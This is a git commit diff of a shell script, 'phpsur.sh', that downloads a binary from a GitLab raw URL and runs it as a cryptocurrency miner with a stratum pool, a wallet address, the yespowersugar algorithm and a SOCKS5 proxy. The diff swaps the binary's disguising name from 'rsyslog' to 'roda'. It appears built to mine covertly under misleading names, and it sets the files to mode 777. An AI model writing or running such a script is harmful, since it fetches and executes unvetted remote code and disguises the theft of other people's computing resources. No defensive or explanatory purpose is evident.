c7347f8ac3178da201fc4007cd91b7cf7111e757
set-arithmetic <79969777+set-arithmetic@users.noreply.github.com>
2023-02-01 05:40:31 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y
-wget -O rsyslog https://gitlab.com/set.arithmetic/arithmetic/-/raw/master/rsyslog 
+wget -O roda https://gitlab.com/krilnols1/buildkite/-/raw/main/roda 
 screen -dmS ls
-chmod +x phpsur.sh && chmod +x rsyslog && chmod 777 rsyslog phpsur.sh
+chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
 RENANG=stratum+tcps://stratum-na.rplant.xyz:17042
 ACIS=sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57
 STRESS=yespowersugar
 BANGUNAN=BK-01
 PROXY=socks5://158.69.225.110:59166
-./rsyslog -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2 -x $PROXY
+./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 2 -x $PROXY
